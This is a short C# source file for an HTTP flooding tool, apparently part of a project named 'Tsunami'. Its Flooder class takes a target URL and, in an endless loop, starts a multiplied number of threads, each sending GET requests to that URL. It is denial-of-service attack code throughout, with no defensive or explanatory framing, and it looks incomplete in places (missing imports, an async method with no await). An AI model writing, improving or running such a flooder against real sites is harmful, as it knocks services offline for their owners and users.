using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;

namespace Tsunami.Handlers
{
    public class Flooder
    {
        public static void HttpFlooder(string url, int mainNum, int multiplier = 100)
        {
            Console.WriteLine($"Flooding {url}");

            Console.WriteLine($"Int with multiplier is {Convert.ToString(mainNum * multiplier)}");

            while (true)
            {
                for (int x = 0; x < mainNum * multiplier; x++)
                {
                    ThreadStart threadInfo = new(() => HttpRequestThread(url));
                    Thread mainThread = new(threadInfo);
                    mainThread.Start();
                }
            }
        }

        public static async Task HttpRequestThread(string url)
        {
            WebRequest request = WebRequest.Create(url);
            request.Method = "GET";

            WebResponse response = request.GetResponse();
            Stream stream = response.GetResponseStream();

            StreamReader reader = new StreamReader(stream);
            string data = reader.ReadToEnd();

            Console.WriteLine(data);
        }
    }
}
